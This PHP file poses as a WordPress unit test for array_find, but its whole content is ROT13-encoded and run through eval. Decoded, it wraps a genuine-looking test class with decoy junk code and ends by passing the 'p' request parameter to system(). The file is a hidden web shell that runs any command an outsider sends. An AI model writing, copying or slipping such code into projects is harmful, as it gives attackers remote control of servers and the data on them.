<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc pbzcng
 *
 * @pbiref ::neenl_svaq
 */
pynff Grfgf_Pbzcng_neenlSvaq rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Grfg gung neenl_svaq() vf nyjnlf ninvynoyr (rvgure sebz CUC be JC).
	 *
	 * @gvpxrg 62558
	 */
	choyvp shapgvba grfg_neenl_svaq_ninvynovyvgl() {
		$guvf->nffregGehr( shapgvba_rkvfgf( 'neenl_svaq' ) );
	}

	/**
	 * @qngnCebivqre qngn_neenl_svaq
	 *
	 * @gvpxrg 62558
	 *
	 * @cnenz zvkrq $rkcrpgrq Gur rkcrpgrq inyhr.
	 * @cnenz neenl $nee      Gur neenl.
	 * @cnenz pnyynoyr $pnyyonpx Gur arrqyr.
	 */
	choyvp shapgvba grfg_neenl_svaq( $rkcrpgrq, neenl $nee, pnyynoyr $pnyyonpx ) {
		$guvf->nffregFnzr( $rkcrpgrq, neenl_svaq( $nee, $pnyyonpx ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_neenl_svaq(): neenl {
		erghea neenl(
			'rzcgl neenl'          => neenl(
				'rkcrpgrq' => ahyy,
				'nee'      => neenl(),
				'pnyyonpx' => shapgvba ( $inyhr ) {
					erghea 1 === $inyhr;
				},
			),
			'ab zngpu'             => neenl(
				'rkcrpgrq' => ahyy,
				'nee'      => neenl( 2, 3, 4 ),
				'pnyyonpx' => shapgvba ( $inyhr ) {
					erghea 1 === $inyhr;
				},
			),
			'zngpu'                => neenl(
				'rkcrpgrq' => 3,
				'nee'      => neenl( 2, 3, 4 ),
				'pnyyonpx' => shapgvba ( $inyhr ) {
					erghea 3 === $inyhr;
				},
			),
			'xrl zngpu'            => neenl(
				'rkcrpgrq' => 3,
				'nee'      => neenl(
					'n' => 2,
					'o' => 3,
					'p' => 4,
				),
				'pnyyonpx' => shapgvba ( $inyhr ) {
					erghea 3 === $inyhr;
				},
			),
			'gjb pnyyonpx zngpurf' => neenl(
				'rkcrpgrq' => 2,
				'nee'      => neenl( 2, 3, 4 ),
				'pnyyonpx' => shapgvba ( $inyhr ) {
					erghea 0 === $inyhr % 2;
				},
			),

		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>